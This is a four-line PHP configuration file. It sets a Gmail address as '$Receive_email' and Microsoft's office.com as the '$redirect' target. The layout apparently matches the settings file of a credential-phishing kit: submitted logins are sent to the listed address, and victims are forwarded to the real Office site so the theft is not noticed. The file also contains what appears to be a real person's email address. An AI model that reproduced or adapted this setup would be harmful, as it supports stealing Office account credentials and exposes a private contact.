<?php 
$Receive_email="margyoneil22@gmail.com";
$redirect="https://office.com/";
?>